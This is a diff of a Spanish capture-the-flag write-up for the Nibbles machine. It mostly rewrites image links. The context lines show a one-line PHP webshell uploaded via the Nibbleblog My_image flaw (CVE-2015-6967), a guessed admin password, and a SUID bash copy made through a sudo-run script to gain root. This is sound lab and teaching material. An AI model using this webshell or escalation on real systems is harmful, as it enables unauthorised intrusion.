@@ -42,15 +42,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Web
 
-![[web.png]]
+![web.png](Images/web.png)
 
 En el código se menciona el directorio `/nibbleblog/` :
 
-![[code.png]]
+![code.png](Images/code.png)
 
 De primeras no hay nada interesante:
 
-![[nibbles.png]]
+![nibbles.png](Images/nibbles.png)
 
 ### Fuzzing
 
@@ -74,11 +74,12 @@ Revela varios directorios interesantes.
 
 En `/nibbleblog/README` se encuentra la versión de `Nibbleblog v4.0.3`:
 
-![[version.png]]
+![version.png](Images/version.png)
 
 y en  `/nibbleblog/content/private/users.xml` se revela el usuario `admin`:
 
-![[admin.png]]
+![admin.png](Images/admin.png)
+
 # Arbitrary File Upload(CVE-2015-6967)
 
 El plugin My_image de nibbleblog en versiones anteriores a 4.0.5, Permite a administradores ejecutar codigo remoto subiendo un archivo con extensión ejecutable, accediendo a el en `content/private/plugins/my_image/image.php`.
@@ -86,11 +87,11 @@ El plugin My_image de nibbleblog en versiones anteriores a 4.0.5, Permite a admi
 
 Hice fuzzing de nuevo con la extencion `.php` y revelo el archivo `admin.php` que contiene un panel de login: 
 
-![[login.png]]
+![login.png](Images/login.png)
 
 Afortunadamente probando con el usuario`admin` encontrado antes y la contraseña `nibbles` accedo al dashboard:
 
-![[dashboard.png]]
+![dashboard.png](Images/dashboard.png)
 
 En la configuracion del plugin My_image subi un archivo php con una simple webshell:
 
@@ -100,11 +101,11 @@ system($_GET['crab'])
 ?>
 ```
 
-![[plugin.png]]
+![plugin.png](Images/plugin.png)
 
 En `/nibbleblog/content/private/plugins/my_image/image.php?crab=id`
 
-![[id.png]]
+![id.png](Images/id.png)
 
 # Shell como nibbler
 
@@ -151,7 +152,7 @@ Archive:  personal.zip
 
 Probé a añadir un comando al final del script para comprobar si lo ejecuta:
 
-![[monitor.png]]
+![monitor.png](Images/monitor.png)
 
 y funciona:
 
@@ -168,13 +169,12 @@ cp /bin/bash /tmp/crab.sh && chmod u+s /tmp/crab.sh
 ```
 
 ```
-nibbler@Nibbles:/home/nibbler$ /tmp/crab.sh -p
-```
-
-```
+nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh
 nibbler@Nibbles:/home/nibbler$ /tmp/crab.sh -p
 crab.sh-4.3# whoami
 root
 crab.sh-4.3# cat /root/root.txt 
 55e60a4914**********************
 ```
+
+# 🦀
